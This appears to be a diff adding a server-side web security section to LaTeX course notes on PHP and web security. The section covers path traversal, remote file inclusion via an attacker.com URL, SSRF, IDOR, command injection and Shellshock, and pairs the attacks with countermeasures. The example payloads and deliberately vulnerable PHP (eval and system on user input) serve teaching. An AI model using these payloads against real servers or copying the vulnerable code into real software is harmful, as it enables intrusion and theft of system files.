@@ -60,7 +60,8 @@
     basewidth=0.5em,
     autogobble,
     xleftmargin=3.0ex,
-    mathescape=true
+    mathescape=false,
+    % literate={\$}{{\textcolor{blue}{\$}}}1
 }
 \newcommand{\dollar}{\mbox{\textdollar}} %
 \lstset{style=main}
@@ -1505,19 +1506,19 @@
 
                 PHP is an imperative language with aliasing;
                 \begin{lstlisting}
-                    $\dollar$x = 0;
-                    $\dollar$y = &$\dollar$x;       // $\dollar$x and $\dollar$y are now aliased
-                    $\dollar$y = "hello";
-                    echo $\dollar$x;       // prints "hello"
+                    $x = 0;
+                    $y = &$x;       // $x and $y are now aliased
+                    $y = "hello";
+                    echo $x;        // prints "hello"
                 \end{lstlisting}
                 It also allows for dynamic variable names;
                 \begin{lstlisting}
-                    $\dollar$x = "y";
-                    $\dollar$y = "hello";
-                    echo $\dollar$$\dollar$x;       // prints "hello"
+                    $x = "y";
+                    $y = "hello";
+                    echo $$x;       // prints "hello"
 
-                    $\dollar${"x"} = "y";
-                    $\dollar$z = {"x".$\dollar$x};
+                    ${"x"} = "y";
+                    $z = {"x".$x};
                 \end{lstlisting}
                 PHP also performs implicit type conversion (type juggling) to ease the burden on developers.
                 However, this has a quirk with strings, where the string literal ~"0"~ will be treated as ~false~ (as a boolean), and any other string is treated as ~true~.
@@ -1528,64 +1529,64 @@
 
                 A key data structure in PHP is the array (global variables are stored inside an array, objects are arrays containing fields, and a hidden pointer to the class);
                 \begin{lstlisting}
-                    $\dollar$x = array(
+                    $x = array(
                         "foo" => "bar",
                         4.5   => "baz"
                     );
-                    $\dollar$x[] = "default";    // uses the default key 5 (first int greater than all keys)
-                    echo $\dollar$x[5];          // prints "default"
-                    echo current($\dollar$x);    // prints "bar"
-                    next($\dollar$x);            // advances the pointer
-                    echo current($\dollar$x);    // prints "baz"
+                    $x[] = "default";    // uses the default key 5 (first int greater than all keys)
+                    echo $x[5];          // prints "default"
+                    echo current($x);    // prints "bar"
+                    next($x);            // advances the pointer
+                    echo current($x);    // prints "baz"
 
-                    $\dollar$GLOBALS["y"] = 42;  // 'super' global
-                    echo $\dollar$y;             // prints 42
+                    $GLOBALS["y"] = 42;  // 'super' global
+                    echo $y;             // prints 42
                 \end{lstlisting}
                 PHP also handles objects as expected;
                 \begin{lstlisting}
-                    $\dollar$obj -> x = 0;
-                    var_dump($\dollar$obj); // prints the following (see next line)
+                    $obj -> x = 0;
+                    var_dump($obj); // prints the following (see next line)
                     > object(stdClass)#1 (1) { ["x"] => int(0) }
                 \end{lstlisting}
                 We can also define classes and inheritance;
                 \begin{lstlisting}
                     class prnt {
-                        private $\dollar$id = "foo";
+                        private $id = "foo";
                         function displaySelf() {
-                            echo $\dollar$this -> id;
+                            echo $this -> id;
                         }
                     }
 
                     class chld extends prnt {
-                        public $\dollar$id = "bar";
+                        public $id = "bar";
                         public function displayParent() {
                             parent::displaySelf();
                         }
                     }
 
-                    $\dollar$obj = new chld();
-                    $\dollar$obj -> displayParent(); // prints "foo"
+                    $obj = new chld();
+                    $obj -> displayParent(); // prints "foo"
                 \end{lstlisting}
                 In arrays, there are subtle quirks in copying;
                 \begin{lstlisting}
-                    $\dollar$x = array(1, 2, 3);
-                    $\dollar$y = $\dollar$x;
-                    $\dollar$x[0] = "updated";
-                    echo $\dollar$y[0];              // prints 1 (as expected)
+                    $x = array(1, 2, 3);
+                    $y = $x;
+                    $x[0] = "updated";
+                    echo $y[0];              // prints 1 (as expected)
 
-                    $\dollar$x = array(1, 2, 3);
-                    $\dollar$temp = &$\dollar$x[1];           // here we introduce sharing
-                    $\dollar$y = $\dollar$x;                  // assigning normally
-                    $\dollar$x[0] = "regular";       // update regular element
-                    $\dollar$x[1] = "shared";        // update shared element
+                    $x = array(1, 2, 3);
+                    $temp = &$x[1];          // here we introduce sharing
+                    $y = $x;                 // assigning normally
+                    $x[0] = "regular";       // update regular element
+                    $x[1] = "shared";        // update shared element
 
-                    var_dump($\dollar$x);            // gives the following;
+                    var_dump($x);            // gives the following;
                     > array(3) {
                         [0] => string(7) "regular"
                         [1] => &string(6) "shared"
                         [2] => int(3) }
 
-                    var_dump($\dollar$y);            // gives the following;
+                    var_dump($y);            // gives the following;
                     > array(3) {
                         [0] => int(1)
                         [1] => &string(6) "shared"
@@ -1594,14 +1595,14 @@
                 The lazy evaluation of functions in PHP can lead to the following quirk;
                 \begin{lstlisting}
                     function mod_x() {
-                        global $\dollar$x;
-                        $\dollar$x = array('a', 'b');
+                        global $x;
+                        $x = array('a', 'b');
                         return 0;
                     }
 
-                    $\dollar$x = array(1, 2);
-                    $\dollar$x[0] = mod_x();
-                    var_dump($\dollar$x);
+                    $x = array(1, 2);
+                    $x[0] = mod_x();
+                    var_dump($x);
                     > array(2) {
                         [0] => int(0)
                         [1] => string(1) "b" }
@@ -1609,4 +1610,181 @@
                 Due to the interplay of aliasing, objects, conversions, string to code conversion, and optimisations, it can be difficult to statically analyse.
                 \textit{Hack} restricts PHP to provide a static type system.
             \subsubsection*{Server-side Security}
+                A dated method was CGI scripting, where the server passes the request to the appropriate executable (hence one process is required per request).
+                The headers were passed in as environment variables / arguments, and data passed via ~stdin~ or ~stdout~.
+                Once the server received a request, it pre-processes it, rewriting the URL and performing any internal redirects, then forwarding it to the application (by starting a new PHP interpreter for example).
+                The application processes the script, returns it back to the server which can then apply any compression or encoding required, before sending it back to the client.
+                \medskip
+
+                A more modern approach is \textbf{server-side scripting}, where the server may directly embed the database or execute scripts, such as in ~mod\_perl~ or ~mod\_php~.
+                This tends to be faster than CGI and is more powerful (since the script can reconfigure the server); however this leads to it being more dangerous if an attacker gained execution privileges.
+                \medskip
+
+                Fast CGI is a variant of CGI that improves performance.
+                The key idea is to keep processes to handle certain requests alive (for example, a PHP process can be kept alive to handle future requests).
+                This supports the possibility to perform better load balancing, and allows for app servers to communicate with local sockets or TCP.
+                \medskip
+
+                This is similar to a \textbf{reverse proxy}, where we run two web servers together.
+                A lean, fast, and secure server (such as \textit{NGINX}) handles static content (such as images or CSS) directly, as well as TLS termination etc.
+                Another server runs behind it, allowing the application server to be dedicated to running more interesting payloads.
+                \medskip
+
+                Consider the following attack tree for a server;
+                \begin{enumerate}[1.]
+                    \itemsep0em
+                    \item compromise server
+                        \smallskip
+
+                        Note that 1.1 and 1.2 both involve loading some malicious software to achieve execution privileges;
+                        \begin{enumerate}[{1.}1]
+                            \itemsep0em
+                            \item use social engineering
+                            \item use an insider
+                            \item exploit OS network stack
+                            \item compromise other applications / services
+                            \item compromise web server \hfill most likely
+                                \begin{enumerate}[{1.5.}1]
+                                    \itemsep0em
+                                    \item compromise daemon (the process that is running and listening for incoming connections)
+                                        \smallskip
+
+                                        This is done by exploiting vulnerabilities, either known (with Apache HTTPD, Microsoft IIS both having known vulnerabilities, and can be automated with \textit{Metasploit}) or unknown (new discovery).
+                                    \item exploit insecure configuration
+                                        \smallskip
+
+                                        There are many configuration options on a server, including what to do in case of errors, what part of the filesystem to serve, options about certificates, and what user the server should run as.
+                                    \item compromise the server via the web application
+                                        \smallskip
+
+                                        This is the one we are most interested in.
+                                \end{enumerate}
+                        \end{enumerate}
+                \end{enumerate}
+                There are a number of ways to compromise the server through the web application, including;
+                \begin{itemize}
+                    \itemsep0em
+                    \item \textbf{path traversal}
+                        \smallskip
+
+                        In this attack, the goal is to cause the server to unintentionally disclose resources based on some attacker input.
+                        For example;
+                        \begin{itemize}
+                            \itemsep0em
+                            \item ~http://www.example.com/../../etc/passwd~
+                            \item ~http://www.example.com/images/download.asp?name="../../etc/passwd"~
+                        \end{itemize}
+                        The idea behind path traversal is that the server has too much trust in the user's input, and identifies the resource to serve based on input.
+                        The attacker typically requests files that are likely to exist and unlikely to exist, and compares the responses from the server.
+                        \medskip
+
+                        Approaches to counteract this include giving the ~www~ user access to a limited amount of public files.
+                        Another approach would be to sandbox the entire web application to a virtual file system, using ~chroot~ jail.
+                        The general idea is to segregate the application to be a separate component of the host, rather than a process running at the top level.
+                    \item \textbf{remote file inclusion}
+                        \smallskip
+
+                        This is similar in some ways to path traversal, but instead aims to cause the server to unintentionally execute some script.
+                        In this example, we work with the following ~index.php~ file;
+                        \begin{lstlisting}
+                            ...
+                            $nextpage = $_REQUEST["subpage"];
+                            include($nextpage.".php");
+                            ...
+                        \end{lstlisting}
+                        The intended usage would be to load the ~blog.php~ file in the following;
+                        \begin{center}
+                            ~http://example.com/index.php?subpage=blog~
+                        \end{center}
+                        However, if ~php.ini~ allowed file operations to follow URLs (due to ~allow\_url\_fopen=1~), we could include a malicious script to run on the server;
+                        \begin{center}
+                            ~http://example.com/index.php?subpage=http://attacker.com/evil(.php)~
+                        \end{center}
+                        Typical functions that we should look out for (to prevent vulnerable file inclusion) include; ~include\_once()~, ~require()~, ~require\_once()~, ~fopen()~, ~readfile()~, ~file\_get\_contents()~.
+                        A more secure implementation of the above would be as follows (where we have a whitelist of allowed files);
+                        \begin{lstlisting}
+                            ...
+                            $nextpages = array("blog", "admin", "profile");
+                            $nextpage = $_REQUEST["subpage"];
+                            if (!in_array($nextpage, $nextpages)) { // check we are willing to serve it
+                                echo "invalid request";
+                            } else {
+                                $file = $nextpage.".php";
+                                if (!file_exists($file)) {
+                                    echo "file not found";
+                                } else {
+                                    include($nextpage.".php");
+                                }
+                            }
+                            ...
+                        \end{lstlisting}
+                    \item \textbf{server-side request forgery (SSRF)}
+                        \smallskip
+
+                        This follows a similar line of reasoning as the previous attack.
+                        However, instead of getting the server to execute a script controlled by the attacker, we have the web server issue requests controlled by the attacker.
+                        Since the server is likely to be beyond the firewall, it may have access to services on the intranet, which the attacker could not access.
+                        The following examples show how an attacker could use control the request made by the server;
+                        \begin{itemize}
+                            \itemsep0em
+                            \item ~GET /?url=file:///etc/passwd HTTP/1.1~ \hfill data exfiltration
+                            \item ~GET /?url=http://127.0.0.1:22 HTTP/1.1~ \hfill port scanning
+                        \end{itemize}
+                        Countermeasures include a blacklist for what URLs can be requested, if the user needs to be allowed to provide URLs.
+                        Another approach is to whitelist what can actually be returned back to the user; for example some response from a database should not be issued directly back to the user.
+                    \item \textbf{untrusted query string}
+                        \smallskip
+
+                        It's important to remember that an attacker can easily tamper with the query string.
+                        For example, a legitimate user may unsubscribe from a mailing list by using the following endpoint;
+                        \begin{center}
+                            ~http://example.com/update.php?account=user\_id\&action=unsubscribe~
+                        \end{center}
+                        However, there are two parameters here, which can be vulnerable to tampering;
+                        \begin{itemize}
+                            \itemsep0em
+                            \item \textbf{insecure direct object references} \hfill ~?account=~\red{~target\_id~}~\&action=unsubscribe~
+                                \smallskip
+
+                                Here the application exposes a reference to the an internal implementation object (the user ID) - the attacker may guess an ID and unsubscribe another user.
+                            \item \textbf{missing function-level access control} \hfill ~?account=user\_id\&action=~\red{~upgrade\_to\_root~}
+                                \smallskip
+
+                                Even if this functionality wasn't present on the client side (or even disabled), it may be accepted on the server without checking.
+                        \end{itemize}
+                        In general, \textbf{user input shouldn't be trusted}, and operations should be \textbf{denied by default} (only enabled after authorisation checks).
+                        The user's parameter should be bound to the user's session, rather than specified in the query.
+                    \item \textbf{command injection}
+                        \smallskip
+
+                        In the following example, the attacker guesses that the input is fed directly into the shell, and then specifies an additional command to be run;
+                        \begin{center}
+                            ~http://example.com/ping?ip=8.8.8.8~\red{~;whoami~}
+                        \end{center}
+                        An example of this in PHP would be the following (where the attacker could execute arbitrary PHP code);
+                        \begin{lstlisting}
+                            $in = $_GET['param'];
+                            eval('$out='.$in.';');
+                        \end{lstlisting}
+                        This can be done in a similar way for shell commands called through PHP (where the script executes arbitrary commands on the shell);
+                        \begin{lstlisting}
+                            $email = $_POST['email'];
+                            $subject = $_POST['subject'];
+                            system('mail $email -s $subject < /tmp/text');
+                        \end{lstlisting}
+                        Countermeasures to this include blacklisting (where inputs matching some patterns are blocked) - this isn't ideal since attackers may easily find new parameters which aren't in this list.
+                        On the other hand, whitelisting only allows specific patterns, however care must be taken to avoid false positives.
+                        In general, we need to perform some validation / filtering between the source (where the input originates) and the sink (where the input is used).
+                        \textit{Shellshock} is an example of this, where the initialisation of an environment variable could lead to remote code execution, thus sending a malicious header could be used to perform the exploit;
+                        \begin{center}
+                            $~User-Agent: ~\underbrace{~() \string{:;\string};~}_\text{exploit}~ ~\underbrace{~/bin/cat /etc/passwd~}_\text{payload}$
+                        \end{center}
+                \end{itemize}
+                In general, the attacks we've seen are done by subverting the application's logic, generally due to design mistakes.
+                More sophisticated attacks involve attacking the implementation language at a much lower level, through memory corruption (integer over / underflow, buffer overflows, memory freeing, etc.).
+                This can lead to arbitrary code execution or simply crashing the application.
+                \medskip
+
+                There are also other security issues for servers, including brute force attacks on authentication.
+                Sensitive data can also be exposed either in comments, or through error messages being \textbf{too} descriptive (which can be used to identify SQL injections).
 \end{document}
